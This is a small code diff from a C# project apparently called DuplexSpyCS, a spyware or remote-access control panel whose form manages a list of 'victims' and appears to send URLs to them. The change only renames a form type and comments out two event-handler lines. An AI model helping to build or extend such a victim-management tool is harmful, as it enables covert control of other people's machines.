@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmMultiURL : Form
     {
-        public Form1 frmMain;
+        public frmMain frmMain;
         public List<clsVictim> m_lsVictim;
         private int nCnt = 0;
 
@@ -74,7 +74,7 @@ namespace DuplexSpyCS
 
             toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
 
-            frmMain.listener.ReceivedDecoded += Received;
+            //frmMain.listener.ReceivedDecoded += Received;
         }
 
         private void frmMultiURL_Load(object sender, EventArgs e)
@@ -104,7 +104,7 @@ namespace DuplexSpyCS
 
         private void frmMultiURL_FormClosed(object sender, FormClosedEventArgs e)
         {
-            frmMain.listener.ReceivedDecoded -= Received;
+            //frmMain.listener.ReceivedDecoded -= Received;
         }
 
         //Check All
